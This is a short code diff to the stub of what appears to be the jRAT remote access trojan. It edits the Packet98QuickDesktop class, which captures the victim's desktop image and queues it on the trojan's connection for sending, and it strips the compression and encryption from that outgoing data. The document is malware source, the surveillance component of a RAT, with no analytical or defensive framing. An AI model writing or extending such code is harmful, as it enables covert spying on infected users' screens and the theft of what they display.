@@ -7,10 +7,7 @@ import java.awt.Robot;
 import java.awt.Toolkit;
 import java.awt.image.BufferedImage;
 
-import pro.jrat.common.compress.GZip;
-import pro.jrat.common.crypto.Crypto;
 import pro.jrat.stub.Connection;
-import pro.jrat.stub.Main;
 import pro.jrat.stub.packets.outgoing.Packet68QuickDesktop;
 import pro.jrat.stub.utils.ImageUtils;
 
@@ -42,7 +39,7 @@ public class Packet98QuickDesktop extends AbstractIncomingPacket {
 		BufferedImage resized = new BufferedImage(width, height, BufferedImage.TYPE_INT_RGB);
 		resized.getGraphics().drawImage(image, 0, 0, width, height, null);
 		
-		byte[] buffer = GZip.compress(Crypto.encrypt(ImageUtils.encodeImage(image, 0.1F), Main.getKey()));
+		byte[] buffer = ImageUtils.encodeImage(image, 0.1F); //GZip.compress(Crypto.encrypt(ImageUtils.encodeImage(image, 0.1F), Main.getKey()));
 		
 		Connection.addToSendQueue(new Packet68QuickDesktop(buffer));		
 		
